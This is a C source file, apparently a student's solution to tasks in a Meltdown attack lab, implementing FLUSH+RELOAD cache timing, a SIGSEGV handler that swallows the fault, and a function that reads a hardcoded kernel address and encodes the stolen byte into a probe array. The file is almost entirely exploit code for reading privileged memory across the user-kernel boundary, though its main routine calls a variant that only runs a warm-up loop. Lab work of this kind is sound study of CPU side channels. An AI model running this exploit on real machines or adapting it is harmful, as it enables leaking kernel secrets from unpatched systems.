// Task 6, 7.1, 7.3

#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>

uint8_t array[256 * 4096];

#define DELTA 1024
#define CACHE_HIT_THRESHOLD (100)

void flushSideChannel()
{
    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (i = 0; i < 256; i++)
        array[i * 4096 + DELTA] = 1;

    // Flush the values of the array from cache
    for (i = 0; i < 256; i++)
        _mm_clflush(&array[i * 4096 + DELTA]);
}

void meltdown_asm(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    // Give eax register something to do
    asm volatile(
        ".rept 2000000;"
        "add $0x141, %%eax;"
        ".endr;"
        :
        :
        : "eax");
}

void reloadSideChannel()
{
    int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++)
    {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD)
        {
            printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
            printf("The Secret = %d.\n", i);
        }
    }
}

void meltdown(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    // The following statement will cause an exception
    kernel_data = *(char *)kernel_data_addr;
    // it was 7 instead of kernel_data earlier below here
    array[kernel_data * 4096 + DELTA] += 1;
}
// Signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main()
{
    // Register a signal handler
    signal(SIGSEGV, catch_segv);
    // FLUSH the probing array
    flushSideChannel();
    if (sigsetjmp(jbuf, 1) == 0)
    {
        // change this address here
        // meltdown_asm replaced meltdown function call
        meltdown_asm(0xfab22000);
    }
    else
    {
        printf("Memory access violation!\n");
    }
    // RELOAD the probing array
    reloadSideChannel();
    return 0;
}
